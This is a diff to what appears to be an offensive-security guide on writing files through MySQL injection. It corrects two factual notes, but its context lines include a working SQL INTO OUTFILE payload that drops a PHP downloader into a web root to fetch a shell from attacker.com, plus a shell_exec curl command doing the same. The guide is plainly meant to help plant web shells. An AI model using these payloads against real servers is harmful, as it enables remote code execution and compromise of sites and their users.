@@ -27,7 +27,7 @@ To write files from MySQL, the following conditions must be met:
 | No Overwriting     | INTO OUTFILE/DUMPFILE cannot overwrite existing files                          |
 | Statement Position | The INTO clause must be the last statement in the query                        |
 | Pathname Quoting   | Quotation marks are mandatory for pathnames (hex encoding like 0x cannot work) |
-| Max Packet Size    | Limited by `@@max_allowed_packet` (default ~1MB)                               |
+| Max Packet Size    | Limited by `@@max_allowed_packet` (default 4MB in 5.7, 64MB in 8.0+)           |
 
 ### Methods for Writing Files
 
@@ -110,7 +110,7 @@ If the query length is limited, write a small downloader to fetch the full shell
 SELECT '<?php fwrite(fopen("shell.php","w"),file_get_contents("http://attacker.com/shell.txt"));?>' INTO OUTFILE '/var/www/html/downloader.php';
 ```
 
-**Prerequisite:** This technique requires `allow_url_fopen=On` in php.ini (disabled by default on hardened systems). Alternatives when disabled: use curl (`shell_exec("curl -o shell.php http://attacker.com/shell.txt")`) or stage the payload locally via another SQL injection write.
+**Prerequisite:** This technique requires `allow_url_fopen=On` in php.ini (enabled by default in PHP, but often disabled in security-hardened configurations). Alternatives when disabled: use curl (`shell_exec("curl -o shell.php http://attacker.com/shell.txt")`) or stage the payload locally via another SQL injection write.
 
 ### Writing Multiple Lines
 
